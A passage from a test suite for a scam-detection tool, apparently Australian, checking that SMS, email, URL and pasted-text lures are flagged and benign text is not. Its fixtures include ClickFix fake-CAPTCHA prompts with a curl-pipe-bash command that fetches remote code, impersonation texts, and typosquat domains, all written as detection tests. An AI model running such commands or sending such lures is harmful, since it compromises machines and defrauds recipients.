  it("does not add the no-link warning for a toll operator that does use links (#73)", () => {
    const result = checkSms("Linkt: pay your outstanding toll at https://linkt-pay.example");
    expect(result.flags.some((f) => f.includes("removed links from their unsolicited SMS"))).toBe(false);
  });

  it("detects ClickFix 'press Win+R' social engineering in SMS (D3 / #74)", () => {
    const result = checkSms("Verify you are human: press Win+R, paste this command and hit enter.");
    expect(result.flags.some((f) => f.includes("Press Win+R"))).toBe(true);
    expect(result.score).toBeGreaterThanOrEqual(50);
  });

  it("detects ClickFix instructions in free-text / pasted page content (D3 / #74)", () => {
    const result = checkCustom("To confirm you're human, press Windows+R and paste the following command.");
    expect(result.flags.some((f) => f.includes("Press Win+R"))).toBe(true);
  });

  // The "+" and the spaces around it were a single ambiguous run; they are now
  // one alternation of "+ with optional spaces" or "spaces alone". Both scoring
  // paths use the same pattern, so both are checked.
  it.each([
    "press Win+R",
    "press Win + R",
    "press Win R",
    "press  Windows  +  R",
    "press windows+r",
    "press Win +R",
    "press Win+ R",
  ])("reads %j as a ClickFix instruction however it is spaced (D3 / #74)", (text) => {
    const framed = `Verify you are human: ${text}, then paste this command.`;
    expect(checkSms(framed).flags.some((f) => f.includes("Press Win+R"))).toBe(true);
    expect(checkCustom(framed).flags.some((f) => f.includes("Press Win+R"))).toBe(true);
  });

  // ── ClickFix macOS variant (D3 / #143 / ACSC ASC-2026-0809) ────────────────
  // Same tactic as Win+R, different keystroke. The hard part is the negative
  // case: "open Terminal" and `curl | bash` are ordinary developer phrases, so
  // the rule requires a delivery cue AND a clipboard/fake-CAPTCHA co-signal.

  it("detects the macOS Spotlight paste lure in SMS (D3 / #143)", () => {
    const result = checkSms(
      "Verification required: press Cmd+Space, type Terminal, then paste the command below to prove you're human.",
    );
    expect(result.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(true);
    expect(result.score).toBeGreaterThanOrEqual(50);
  });

  it("detects a curl-pipe-bash command paired with fake-CAPTCHA framing (D3 / #143)", () => {
    const result = checkCustom(
      "Confirm you are not a robot — copy this and run it: curl -s https://verify-fix.cyou/f.sh | bash",
    );
    expect(result.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(true);
  });

  it("detects the Terminal paste lure in pasted page content (D3 / #143)", () => {
    const result = checkCustom(
      "Browser error detected. To fix it, open Terminal and paste the following command.",
    );
    expect(result.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(true);
  });

  it("does not fire on legitimate CLI install instructions (D3 / #143)", () => {
    // The whole point of the co-signal requirement. A README says "run this in
    // Terminal" and stops; it never adds a human-verification framing.
    //
    // Asserts the *verdict*, not just the absence of the flag: the terminal
    // phrasings are also plain requestWords, so a flag-only assertion would pass
    // while the message still scored its way toward "suspicious".
    const benign = [
      "To install the CLI, open Terminal and run: brew install ripgrep",
      "Install with: curl -fsSL https://get.example.dev/install.sh | sh",
      "Run in terminal: npm install && npm test",
      "Paste in terminal to set up the dev environment.",
    ];
    for (const text of benign) {
      const r = checkCustom(text);
      expect({ text, hit: r.flags.some((f) => f.includes("macOS ClickFix variant")) })
        .toEqual({ text, hit: false });
      expect({ text, verdict: r.verdict }).toEqual({ text, verdict: "safe" });
    }
  });

  it.each([
    "Confirm you are not a robot",
    "I'm not a robot",
    "Verify you're human",
    "Prove you are human",
    "Complete the CAPTCHA",
    "Human verification required",
  ])("treats fake-verification phrasing %p as a ClickFix co-signal (D3 / #143)", (framing) => {
    // Narrowing the clipboard cue made captchaFraming the only co-signal for a
    // bare `curl | bash`, so it has to cover how the campaigns actually word it —
    // an earlier revision matched only "i'm not a robot" and silently let
    // "confirm you are not a robot" through.
    const r = checkCustom(`${framing}: curl -s https://x.cyou/f.sh | bash`);
    expect(r.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(true);
  });

  it("does not fire on 'robot'/'human' outside a verification framing (D3 / #143)", () => {
    for (const text of [
      "Our robot vacuum guide: open Terminal and copy the log.",
      "The human resources team will copy you on the email.",
    ]) {
      const r = checkCustom(text);
      expect({ text, hit: r.flags.some((f) => f.includes("macOS ClickFix variant")) })
        .toEqual({ text, hit: false });
      expect({ text, verdict: r.verdict }).toEqual({ text, verdict: "safe" });
    }
  });

  it("does not fire on copying output out of Terminal (D3 / #143)", () => {
    // Regression: bare "copy" as a clipboard cue scored this likely_scam (58).
    // The attack direction is content moving *into* the shell — copying output
    // out to a support ticket is the opposite, and is ordinary support advice.
    const r = checkCustom("Open Terminal and copy the output into this support ticket.");
    expect(r.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(false);
    expect(r.verdict).toBe("safe");
  });

  it("does not fire on 'spotlight' used as an ordinary noun (D3 / #143)", () => {
    // Regression: bare "spotlight" as a delivery cue scored this likely_scam
    // (50). This app publishes scam-awareness copy, so it would flag its own
    // writing.
    const r = checkCustom("Our new report puts the spotlight on scam trends. Copy the link to share it.");
    expect(r.flags.some((f) => f.includes("macOS ClickFix variant"))).toBe(false);
    expect(r.verdict).toBe("safe");
  });

  it("still fires when Spotlight is the launcher (D3 / #143)", () => {
    // The other half of the narrowed cue — the real lure must still be caught.
    for (const text of [
      "Press Spotlight, type Terminal, and paste this to verify you're human.",
      "Open Spotlight search then paste the command below.",
    ]) {
      expect({ text, hit: checkCustom(text).flags.some((f) => f.includes("macOS ClickFix variant")) })
        .toEqual({ text, hit: true });
    }
  });

  it("scores the macOS ClickFix variant once when both variants appear (D3 / #143)", () => {
    // The Win+R and macOS branches are mutually exclusive, so a cross-platform
    // lure raises one ClickFix flag, not two for a single instruction.
    //
    // The flag count is the assertion that matters: verified by mutation —
    // flipping the `else if` back to a plain `if` fails this test. A score bound
    // can't do that job, because both messages already clamp at 100.
    const both = checkSms("Press Win+R (Windows) or Cmd+Space and open Terminal, then paste this command.");
    expect(both.flags.filter((f) => f.includes("ClickFix")).length).toBe(1);
  });

  // ── AU customs / import-duty parcel lures (D2 / #142 / ABF 6 Aug 2026) ─────

  it("detects customs-clearance parcel lures in AU (D2 / #142)", () => {
    const result = checkSms(
      "AusPost: your parcel is held at customs. Pay the outstanding import duty to release your parcel: http://auspost-clearance.cyou/pay",
      undefined,
      "AU",
    );
    expect(result.flags.some((f) => f.toLowerCase().includes("urgency"))).toBe(true);
    expect(result.verdict).toBe("likely_scam");
  });

  it.each(["customs fee", "customs charge", "clearance fee", "held by customs", "held at border"])(
    "flags the AU customs phrase %p (D2 / #142)",
    (phrase) => {
      const result = checkSms(`Your delivery is on hold. A ${phrase} is payable.`, undefined, "AU");
      expect(result.flags.join(" | ").toLowerCase()).toContain("urgency");
    },
  );

  // ── AU state-government impersonation (D1 / #141 / ACSC ASC-2026-0807) ─────

  it.each([
    "VicRoads: your licence will be suspended over an unpaid fine.",
    "Service NSW: an outstanding fine requires payment today.",
    "Revenue NSW has issued a penalty notice against your vehicle.",
    "Transport NSW: your registration is suspended pending payment.",
    "QLD Transport: unpaid infringement on your account.",
    "Department of Transport WA: your licence is suspended pending payment.",
    "VCAT has scheduled a hearing regarding your unpaid debt.",
  ])("flags AU state government agency impersonation: %s (D1 / #141)", (text) => {
    const result = checkSms(`${text} Pay now: http://fines-pay.cyou/x`, undefined, "AU");
    expect(result.flags.some((f) => f.includes("government agency"))).toBe(true);
  });

  it("does not treat state agency names as no-link senders (D1 / #141)", () => {
    // noLinkSenders is a strict subset of authorityMentions and the flag copy
    // names only the federal bodies — VicRoads does use links, so the stronger
    // "removed links from their SMS" claim must not attach to it.
    const result = checkSms(
      "VicRoads: pay your fine at http://vicroads-fines.cyou/pay",
      undefined,
      "AU",
    );
    expect(result.flags.some((f) => f.includes("removed links"))).toBe(false);
  });

  it("does not fire state agency names inside ordinary words (D1 / #141)", () => {
    // "vcat" is 4 chars, so it is substring-matched rather than boundary-matched.
    // Guard against the class of bug that "acc" ⊂ "account" caused for NZ.
    const benign = [
      "The advocate will call you back about the invoice.",
      "Please allocate the remaining budget this week.",
      // Regression: "dot wa" was a 6-char substring entry, so it matched a
      // longhand URL and ordinary prose. Replaced by the full agency name.
      "See site dot washington dot edu for details.",
      "The dot was red on the delivery map.",
    ];
    for (const text of benign) {
      const flags = checkSms(text, undefined, "AU").flags.join(" | ");
      expect({ text, hit: flags.includes("government agency") }).toEqual({ text, hit: false });
    }
  });

  // ── AU private health insurer impersonation (D4 / 2026-08-09 roadmap) ──────

  it.each([
    "Medibank: your policy is expiring, update your payment details.",
    "Bupa: your membership has been suspended pending verification.",
    "Your nib health cover renewal failed — update your details.",
    "HCF health: your policy requires immediate verification.",
  ])("flags AU health insurer impersonation: %s (D4)", (text) => {
    const result = checkSms(`${text} http://policy-renew.cyou/x`, undefined, "AU");
    expect(result.flags.some((f) => f.includes("well-known company"))).toBe(true);
  });

  // All three stay in brandMentions, including "ahm" — a message body naming a
  // fund is the lure itself, and the boundary match makes it safe here. Only the
  // URL checker drops "ahm", where a hostname label can legitimately be that
  // token; see the typosquat test below.
  it.each(["nib", "hcf", "ahm"])(
    "boundary-matches the short health fund %p rather than substring-matching it (D4)",
    (fund) => {
      const hit = checkSms(`${fund}: your policy is suspended.`, undefined, "AU");
      expect(hit.flags.some((f) => f.includes("well-known company"))).toBe(true);
    },
  );

  it("does not fire health fund names inside ordinary words (D4)", () => {
    // brandMentions.substring is matched with a plain includes(), so the short
    // funds live in the `word` list. Without that, "nib" hits "nibble" and
    // "ahm" hits every "Ahmed" — a common surname in forwarded mail.
    const benign = [
      "Ahmed sent through the signed contract this morning.",
      "The dog had a nibble of the sandwich.",
      "Please confirm the Ahmadi booking for Tuesday.",
      "Congratulations on the promotion!",
    ];
    for (const text of benign) {
      const flags = checkSms(text, undefined, "AU").flags.join(" | ");
      expect({ text, hit: flags.includes("well-known company") }).toEqual({ text, hit: false });
    }
  });

  it("flags health-fund typosquat domains but not lookalike words (D4)", () => {
    for (const host of ["http://medibank-renew.cyou", "http://nib-claims.top", "http://hcf-login.cyou"]) {
      expect(checkUrl(host, undefined, "AU").flags.some((f) => f.includes("Impersonates")))
        .toBe(true);
    }
    // Separator-split label matching keeps these clear.
    for (const host of ["https://bonnibel.com", "https://ahmed-photography.com"]) {
      expect({ host, hit: checkUrl(host, undefined, "AU").flags.some((f) => f.includes("Impersonates")) })
        .toEqual({ host, hit: false });
    }
    // "ahm" is not a URL-checker brand: boundary matching stops substring
    // collisions but not a label that genuinely IS the token, and "ahm" is a
    // common surname/initialism, so these unrelated businesses would have
    // scored the full +45 brand hit — likely_scam on that signal alone.
    for (const host of ["http://ahm-photography.com", "http://ahm-legal.com", "http://ahm-transport.com"]) {
      expect({ host, hit: checkUrl(host, undefined, "AU").flags.some((f) => f.includes("Impersonates")) })
        .toEqual({ host, hit: false });
    }
    // The funds' real sites must stay clean.
    for (const host of ["https://www.medibank.com.au", "https://bupa.com.au"]) {
      expect({ host, verdict: checkUrl(host, undefined, "AU").verdict })
        .toEqual({ host, verdict: "safe" });
    }
  });

  it("scores brand squats on .com.au now the blanket exemption is gone", () => {
    // .com.au used to be exempt wholesale, so these raised no impersonation flag
    // at all — the suffix scammers can buy with a free ABN was suppressing the
    // strongest signal against them. Not specific to the D4 brands: the
    // long-standing commbank and mygov entries were equally invisible.
    for (const host of [
      "http://medibank-renew-login.com.au",
      "http://commbank-secure-verify.com.au",
      "http://mygov-verify-login.com.au",
      "http://anz-online-banking.com.au",
      "http://westpac-secure.com.au",
      "http://my-commbank.com.au",
    ]) {
      const result = checkUrl(host, undefined, "AU");
      expect({ host, impersonation: result.flags.some((f) => f.includes("Impersonates")) })
        .toEqual({ host, impersonation: true });
    }
  });

  it("keeps real .com.au brand sites clean without the suffix exemption", () => {
    // The protection that matters is the other exemption in checkUrl — the brand
    // owning the registrable label — which is region-agnostic and unaffected by
    // the trustedHostSuffixes change. Government sites keep their own exemption.
    for (const host of [
      "https://medibank.com.au", "https://www.medibank.com.au", "https://bupa.com.au",
      "https://nib.com.au", "https://hcf.com.au", "https://ahm.com.au",
      "https://commbank.com.au", "https://www.westpac.com.au", "https://anz.com.au",
      "https://telstra.com.au", "https://qantas.com.au", "https://agl.com.au",
      "https://my.gov.au", "https://ato.gov.au", "https://servicesaustralia.gov.au",
    ]) {
      const result = checkUrl(host, undefined, "AU");
      expect({ host, impersonation: result.flags.some((f) => f.includes("Impersonates")) })
        .toEqual({ host, impersonation: false });
    }
  });

  it("does not flag Velocity Frequent Flyer's own site or unrelated 'velocity' businesses", () => {
    // "velocity" was a substring brand whose comment assumed the real site was
    // .com.au and therefore exempt. It is velocityfrequentflyer.com — a .com,
    // where no suffix exemption applied, and the brand never owned that label
    // either, so the program's own site scored likely_scam. The bare word also
    // hit unrelated real businesses.
    for (const host of [
      "https://www.velocityfrequentflyer.com",
      "https://business.velocityfrequentflyer.com",
      "https://join.velocityfrequentflyer.com",
      "https://velocityglobal.com",
      "https://velocitypartners.com",
      "https://www.velocitybank.com",
    ]) {
      const result = checkUrl(host, undefined, "AU");
      expect({ host, impersonation: result.flags.some((f) => f.includes("Impersonates")) })
        .toEqual({ host, impersonation: false });
    }
    // The squat shapes must still score.
    for (const host of ["http://velocity-points-login.cyou", "http://velocityfrequentflyer-login.top"]) {
      expect({ host, hit: checkUrl(host, undefined, "AU").flags.some((f) => f.includes("Impersonates")) })
        .toEqual({ host, hit: true });
    }
  });

  // ── AU super "rule change" lure (D5 / 2026-08-09 roadmap / ATO Aug 2026) ────

  it.each([
    "super rule change",
    "superannuation rule change",
    "new super rules",
    "super law change",
    "changes to your super",
  ])("flags the AU super rule-change lure phrase %p (D5)", (phrase) => {
    const result = checkSms(
      `ATO: a ${phrase} affects your balance. Verify your details to avoid losing access: http://super-verify.cyou/x`,
      undefined,
      "AU",
    );
    expect(result.flags.join(" | ").toLowerCase()).toContain("urgency");
    expect(result.verdict).toBe("likely_scam");
  });

  it("does not fire on a bare 'rule change' with no super framing (D5)", () => {
    // urgency.pension scores standalone (+10/hit), so every entry is anchored to
    // super/superannuation. Regulatory change is ordinary business copy and a
    // bare "rule change" entry would flag legitimate fund and employer mail.
    const benign = [
      "A rule change was announced for the competition this season.",
      "Please note the rule change in the office parking policy.",
      "New rules apply to the tender process from July.",
    ];
    for (const text of benign) {
      const flags = checkSms(text, undefined, "AU").flags.join(" | ");
      expect({ text, hit: flags.toLowerCase().includes("urgency") }).toEqual({ text, hit: false });
    }
  });

  // ── SVG phishing attachment (D6 / 2026-08-09 roadmap / APWG Q2 2026) ───────

  it.each([
    "Please see the attached invoice.svg for your records.",
    "Your statement.svg is attached — open it to view the details.",
    "Download remittance-advice.svg to confirm the payment.",
  ])("flags SVG attachment phishing: %s (D6)", (text) => {
    const result = checkEmail(`From: billing@acme-invoices.cyou\n\n${text}`);
    expect(result.flags.some((f) => f.includes("SVG file attached"))).toBe(true);
  });

  it("does not flag .svg asset references in ordinary email markup (D6)", () => {
    // The extension is an everyday asset suffix — it sits in the logo and
    // tracking-pixel URLs at the foot of most marketing mail, which is exactly
    // the kind of email this app is handed. Only attachment-adjacent .svg counts.
    const benign = [
      'Thanks for subscribing!\n\n<img src="https://cdn.example.com/logo.svg" alt="logo">',
      "Our brand kit includes logo.svg and icon.svg in the shared drive.",
      'Footer: <img src="https://track.example.com/pixel.svg" width="1">',
      // Regression: a bare verb near any .svg used to be enough, so the standard
      // marketing header flagged as a phishing attachment. On ONE line — the
      // original guard passed only because [^\n] happened to block the newline,
      // which is not a property worth relying on.
      'View in browser <img src="https://e.co/l.svg">',
      'View this email in your browser <img src="https://cdn.co/logo.svg">',
      'See our new range <img src="https://e.co/banner.svg">',
      'Download the report <img src="https://e.co/icon.svg">',
      // Regression: bare "file"/"document" as the trailing half made ordinary
      // office chatter a hit.
      "Our logo.svg file lives in the shared drive.",
      "The icon.svg document is in the brand kit.",
      // Regression: the URL guard only covered absolute and quoted-attribute
      // .svg, so a root-relative or unquoted src — just as ordinary in real
      // HTML mail — was still read as an attachment.
      "<img src=/assets/logo.svg> your statement is ready",
      "<img src=logo.svg> see the statement below",
      'Footer <img src="/assets/logo.svg"> statement',
      "<img src='/img/pixel.svg'> your invoice is ready to view online",
    ];
    for (const text of benign) {
      const flags = checkEmail(text).flags.join(" | ");
      expect({ text, hit: flags.includes("SVG file attached") }).toEqual({ text, hit: false });
    }
  });

  it("keeps the SVG signal below likely_scam on its own (D6)", () => {
    // A delivery-mechanism signal, not proof of intent — it escalates by
    // compounding with sender spoofing or urgency, per the roadmap note.
    const result = checkEmail("Please see the attached invoice.svg for your records.");
    expect(result.flags.some((f) => f.includes("SVG file attached"))).toBe(true);
    expect(result.verdict).not.toBe("likely_scam");
  });

  it("does not double-score one attachment via both rules (D6)", () => {
    // "open the attached invoice.svg" satisfies the generic open-attachment rule
    // (+25) and the SVG rule (+20) — but it is a single attachment, and charging
    // both put it on exactly 45, the likely_scam boundary, by arithmetic alone.
    // The specific SVG wording still replaces the generic flag.
    const result = checkEmail("Please open the attached invoice.svg");
    expect(result.flags.some((f) => f.includes("SVG file attached"))).toBe(true);
    expect(result.score).toBe(25);
    expect(result.verdict).not.toBe("likely_scam");
  });

  it("still charges the SVG signal when the email carries two distinct attachments (D6)", () => {
    // The de-dup is about one file described twice, not about the word
    // "attachment" appearing anywhere in the email. Keying it off a whole-text
    // boolean suppressed the SVG charge here too — under-scoring a mail that
    // carries a decoy document AND an SVG payload, which is strictly worse than
    // the single-file case it was meant to protect.
    const result = checkEmail(
      "Please open the attached document.\n\nSeparately, your invoice.svg is attached for the other account.",
    );
    expect(result.flags.some((f) => f.includes("SVG file attached"))).toBe(true);
    expect(result.flags.some((f) => f.includes("Prompts you to open"))).toBe(true);
    expect(result.score).toBe(45);
  });

  it("still escalates an SVG attachment when a real second signal is present (D6)", () => {
    // The point of keeping it low is that genuinely independent evidence is what
    // escalates — here a spoofed sender domain, not a re-count of the same file.
    const result = checkEmail(
      "From: billing@ato-invoices.cyou\n\nATO: your statement is overdue. Open the attached invoice.svg immediately or penalties apply.",
    );
    expect(result.flags.some((f) => f.includes("SVG file attached"))).toBe(true);
    expect(result.verdict).toBe("likely_scam");
  });

  it("detects device-code / OAuth phishing language in email (D4 / #75)", () => {
    const result = checkEmail(
      "From: security@micros0ft-verify.com\n\nMicrosoft: enter this device code at microsoft.com/devicelogin to verify your new device.",
    );
    expect(result.flags.some((f) => f.includes("Device code phishing"))).toBe(true);
  });

  it("detects WhatsApp investment-group recruitment with 2+ signals (D5 / #76)", () => {
    const result = checkSms("Join our crypto group — exclusive trading tips. I'll add you to our WhatsApp.");
    expect(result.flags.some((f) => f.includes("Investment group recruitment"))).toBe(true);
  });

  it("does not trip the investment-group composite on a single benign signal (#76)", () => {
    const result = checkSms("Join our investment group for our free weekly newsletter.");
    expect(result.flags.some((f) => f.includes("Investment group recruitment"))).toBe(false);
  });

  it("flags .zip, .mov and .lat TLDs (D6 / #77)", () => {
    for (const host of ["https://invoice-download.zip", "https://voicemail.mov", "https://claim-now.lat"]) {
      const result = checkUrl(host);
      expect(result.flags.some((f) => f.includes("top-level domain"))).toBe(true);
    }
  });

  it("detects the ACMA 'Unverified' label override tactic (D7 / #78)", () => {
    const result = checkSms("NAB: this message may appear as Unverified due to a carrier update — it is genuine.");
    expect(result.flags.some((f) => f.includes("'Unverified' label override"))).toBe(true);
  });
});

describe("threat-intel roadmap 2026-07-12 (#80-#85)", () => {
  it("detects fake product-recall SMS lure language (D1 / #80)", () => {
    const result = checkSms("This is a product recall notice for your recent order.");
    expect(result.flags.some((f) => f.includes("product recall"))).toBe(true);
  });

  it("flags Qantas and Velocity URL typosquats (D2 / #81)", () => {
    for (const host of ["https://qantas-points-verify.xyz/login", "https://velocity-rewards.site"]) {
      const result = checkUrl(host);
      expect(result.score).toBeGreaterThanOrEqual(45);
      expect(result.flags.some((f) => f.includes("Impersonates"))).toBe(true);
    }
  });

  it("does not flag the real qantas.com.au domain (#81)", () => {
    const result = checkUrl("https://www.qantas.com.au/frequent-flyer");
    expect(result.flags.some((f) => f.includes("Impersonates"))).toBe(false);
  });

  it("flags Amazon and YouTube fake-recruiter SMS brand mentions (D3 / #82)", () => {
    const amazon = checkSms("Amazon is hiring product testers, flexible hours. Reply to apply.");
    expect(amazon.flags.some((f) => f.includes("well-known company"))).toBe(true);
    const youtube = checkSms("YouTube Content Team: earn cash rating videos. Message us to join.");
    expect(youtube.flags.some((f) => f.includes("well-known company"))).toBe(true);
  });

  it("flags Cloudflare R2 (r2.dev) phishing hosting (D4 / #83)", () => {
    const result = checkUrl("https://pub-abc123.r2.dev/mygov-login.html");
    expect(result.flags.some((f) => f.includes("r2.dev"))).toBe(true);
    expect(result.score).toBeGreaterThanOrEqual(25);
  });

  it("flags ngrok ephemeral tunnels as phishing hosting (D1 / #119)", () => {
    // Bare tunnel: hosting signal alone (+35) lands in "suspicious".
    const bare = checkUrl("https://abc123.ngrok-free.app");
    expect(bare.flags.some((f) => f.includes("ngrok-free.app"))).toBe(true);
    expect(bare.verdict).toBe("suspicious");

    const tunnel = checkUrl("https://random.ngrok.io/ato");
    expect(tunnel.flags.some((f) => f.includes("ngrok.io"))).toBe(true);
    expect(tunnel.verdict).toBe("suspicious");

    // Compounding with a credential-harvest path escalates past suspicious.
    const login = checkUrl("https://abc123.ngrok-free.app/login");
    expect(login.verdict).toBe("likely_scam");
  });

  it("flags github.io / netlify.app static-site phishing hosting (D2 / #120)", () => {
    const gh = checkUrl("https://ato-verify.github.io/login");
    expect(gh.flags.some((f) => f.includes("github.io"))).toBe(true);
    expect(gh.score).toBeGreaterThanOrEqual(25);

    const netlify = checkUrl("https://mygov-login.netlify.app");
    expect(netlify.flags.some((f) => f.includes("netlify.app"))).toBe(true);
    expect(netlify.score).toBeGreaterThanOrEqual(25);
  });

  it("does not flag a bare github.io project site as suspicious (#120 FP guard)", () => {
    const result = checkUrl("https://username.github.io");
    expect(result.verdict).toBe("safe");
  });

  it("still treats real AU government domains as safe (#119 regression)", () => {
    expect(checkUrl("https://ato.gov.au").verdict).toBe("safe");
  });

  it("detects ATO tax debt / audit coercion language (D7 / #124)", () => {
    const debt = checkSms("URGENT: The ATO has identified an outstanding tax debt of $4,219. Your TFN will be suspended in 24 hours. Call 1300 555 111.");
    expect(debt.verdict).toBe("likely_scam");

    const audit = checkSms("You have been selected for a tax audit. Failure to respond in 48 hours will result in legal action will be taken. ATO Compliance.");
    expect(audit.verdict).toBe("likely_scam");
  });

  it("still scores ATO refund lures correctly (#124 regression)", () => {
    const refund = checkSms("Your tax refund waiting to be claimed via myGov.");
    expect(refund.verdict).toBe("likely_scam");
  });

  it("detects energy retailer impersonation (D3 / #121)", () => {
    const origin = checkSms("Origin Energy: We detected a billing error. Claim your $150 refund: http://originenergy-billing.xyz");
    expect(origin.verdict).toBe("likely_scam");

    const agl = checkSms("AGL: A credit of $86.50 has been applied to your account. Verify bank details now.");
    expect(agl.flags.some((f) => f.includes("well-known company"))).toBe(true);

    expect(checkUrl("https://originenergy-billing.xyz").verdict).toBe("likely_scam");
  });

  it("does not flag 'agl' inside ordinary words (#121 FP guard)", () => {
    const result = checkSms("Your bagel order from the eagle cafe is ready for pickup.");
    expect(result.flags.some((f) => f.includes("well-known company"))).toBe(false);
    expect(result.verdict).toBe("safe");
    // Same collision via the URL checker's substring match.
    expect(checkUrl("https://eagle.org").verdict).toBe("safe");
    expect(checkUrl("https://flagler.com").verdict).toBe("safe");
  });

  it("detects AU crypto exchange impersonation (D6 / #123)", () => {
    const url = checkUrl("https://coinspot-login.pages.dev");
    expect(url.verdict).toBe("likely_scam");
    expect(url.flags.some((f) => f.includes("coinspot"))).toBe(true);
  });

  it("detects crypto-exchange TOAD callback lures (D6 / #123)", () => {
    const coinspot = checkSms("Your CoinSpot account has been suspended. Call 1800 555 222 immediately.");
    expect(coinspot.verdict).toBe("likely_scam");
    expect(coinspot.flags.some((f) => f.includes("never ring customers"))).toBe(true);

    const swyftx = checkSms("Swyftx security: suspicious login detected. Contact support on 1300 111 222.");
    expect(swyftx.verdict).toBe("likely_scam");
  });

  it("does not fire crypto TOAD without a callback number (#123 FP guard)", () => {
    const result = checkSms("Your CoinSpot deposit of $50 has cleared.");
    expect(result.flags.some((f) => f.includes("never ring customers"))).toBe(false);
  });

  it("detects fake voicemail notification lures (D5 / #122)", () => {
    const withUrl = checkSms("You have 1 new voicemail. Listen here: https://abc.ngrok-free.app/vm");
    expect(withUrl.flags.some((f) => f.includes("Fake voicemail"))).toBe(true);
    expect(withUrl.verdict).toBe("likely_scam");

    // No URL — the lure still registers on its own.
    const noUrl = checkSms("You have 2 unheard voicemails. Tap to listen.");
    expect(noUrl.flags.some((f) => f.includes("Fake voicemail"))).toBe(true);

    const missedCall = checkSms("Missed call notification: click to listen to your voicemail");
    expect(missedCall.flags.some((f) => f.includes("Fake voicemail"))).toBe(true);

    // checkEmail inherits the signal via its checkSms delegation.
    const email = checkEmail("You have a new voicemail message waiting. Listen: https://vm-portal.xyz");
    expect(email.flags.some((f) => f.includes("Fake voicemail"))).toBe(true);
  });

  // The quantity and adjective words are each optional, and the pattern was
  // rewritten so that each carries its own trailing space rather than floating
  // between separate space runs. These are the phrasings that rewrite has to
  // keep: every combination of present and absent, and a doubled separator.
  it.each([
    "You have a new voicemail waiting",
    "You have an urgent voicemail",
    "You have 3 unheard voicemail messages",
    "You have two missed voicemail alerts",
    "You have voicemail waiting",
    "You have new voicemail",
    "You  have  a  new  voicemail",
  ])("reads %j as a voicemail lure whatever the optional words (D5 / #122)", (text) => {
    expect(checkSms(text).flags.some((f) => f.includes("Fake voicemail"))).toBe(true);
  });

  it("does not flag conversational voicemail mentions (#122 FP guard)", () => {
    for (const text of [
      "I left you a voicemail, let me know if you got it",
      "Sorry I missed your call, I left a voicemail",
      "Your voicemail box is full",
      "Can you check voicemail when you get a sec?",
    ]) {
      const result = checkSms(text);
      expect(result.flags.some((f) => f.includes("Fake voicemail"))).toBe(false);
      expect(result.verdict).toBe("safe");
    }
  });

  it("detects PDF-embedded QR 'Scanception' phrasing (D7 / #113)", () => {
    for (const text of [
      "The attachment contains a QR code — scan it to confirm delivery.",
      "See attached invoice. The attachment contains a QR code.",
      "The attached PDF contains a QR code.",
      "This attachment includes a QR code to scan.",
      "The attached document has a QR code.",
    ]) {
      expect(checkSms(text).flags.some((f) => f.includes("quishing"))).toBe(true);
    }

    // checkEmail inherits the signal via its checkSms delegation.
    const email = checkEmail("See attached invoice. The attachment contains a QR code.");
    expect(email.flags.some((f) => f.includes("quishing"))).toBe(true);
  });

  it("still catches the original 'scan the QR code' phrasings (#113 regression)", () => {
    for (const text of [
      "Please scan the QR code in the attached PDF to verify your invoice.",
      "Please find attached. Scan the QR code in the attachment.",
    ]) {
      expect(checkSms(text).flags.some((f) => f.includes("quishing"))).toBe(true);
    }
  });

  it("does not flag legitimate attached-QR mentions (#113 FP guard)", () => {
    for (const text of [
      "I've attached the conference poster, the QR code links to the schedule.",
      "The QR code on the attached flyer goes to our booking page.",
      "The attachment contains a summary of last quarter.",
    ]) {
      const result = checkSms(text);
      expect(result.flags.some((f) => f.includes("quishing"))).toBe(false);
      expect(result.verdict).toBe("safe");
    }
  });

  it("detects Operation Road Trap rego/toll vocabulary (D5 / #84)", () => {
    const result = checkSms("Your vehicle registration suspended due to rego restrictions.");
    expect(result.flags.some((f) => f.includes("rego restrictions"))).toBe(true);
  });

  it("detects celebrity/ASIC-claim investment bait keywords (D6 / #85)", () => {
    const result = checkSms("Exclusive investment opportunity: guaranteed returns, verified by ASIC. Double your money.");
    expect(result.flags.some((f) => f.includes("reward language"))).toBe(true);
    expect(result.flags.some((f) => f.includes("guaranteed returns"))).toBe(true);
  });
});

describe("threat-intel roadmap 2026-07-26 (#102, #104, #106)", () => {
  // ── #104: named fraudulent AI trading platforms ─────────────────────────────
  it("flags a named fraudulent investment platform in an SMS (D4 / #104)", () => {
    const result = checkSms("Join Quantum AI now — automated trading, sign up in 2 minutes.");
    expect(result.flags.some((f) => f.includes("fraudulent investment platform"))).toBe(true);
    expect(result.flags.some((f) => f.includes("quantum ai"))).toBe(true);
    expect(result.verdict).toBe("likely_scam");
  });

  it("flags each ASIC-named platform variant (D4 / #104)", () => {
    for (const name of ["Immediate Edge", "Immediate X3", "Bitcoin Era", "Quantum Trade Wave"]) {
      const result = checkSms(`I made $8000 with ${name} last week, want in?`);
      expect(result.flags.some((f) => f.includes("fraudulent investment platform"))).toBe(true);
    }
  });

  it("flags a named platform in pasted free text (D4 / #104)", () => {
    const result = checkCustom("Advertisement: Immediate Connect — the AI that trades crypto for you.");
    expect(result.flags.some((f) => f.includes("fraudulent investment platform"))).toBe(true);
  });

  it("does not flag ordinary text that merely mentions AI or bitcoin (D4 / #104)", () => {
    const result = checkSms("Our team is building an AI feature and researching bitcoin fees.");
    expect(result.flags.some((f) => f.includes("fraudulent investment platform"))).toBe(false);
  });

  // ── #106: myID forced re-registration phishing ──────────────────────────────
  it("flags a myID digital-identity re-registration lure (D6 / #106)", () => {
    const result = checkSms("Your digital identity verification has expired. Re-verify now to keep your myGov access.");
    expect(result.flags.some((f) => f.includes("re-registration lure"))).toBe(true);
  });

  it("flags a suspended-myID variant that omits an agency name (D6 / #106)", () => {
    const result = checkSms("Notice: myID has been suspended. Complete your identity verification to restore access.");
    expect(result.flags.some((f) => f.includes("re-registration lure"))).toBe(true);
  });

  it("does not flag an incidental mention of identity in ordinary copy (D6 / #106)", () => {
    const result = checkSms("Thanks for updating your profile — your details are saved.");
    expect(result.flags.some((f) => f.includes("re-registration lure"))).toBe(false);
  });

  // ── #102: TOAD / callback phishing email ────────────────────────────────────
  it("flags a Norton fake-invoice callback email with a charge and no link (D2 / #102)", () => {
    const email = "Your Norton Antivirus subscription has been renewed and $349.99 has been charged to your account. Call 1-800-555-0142 to cancel this charge or dispute the payment.";
    const result = checkEmail(email);
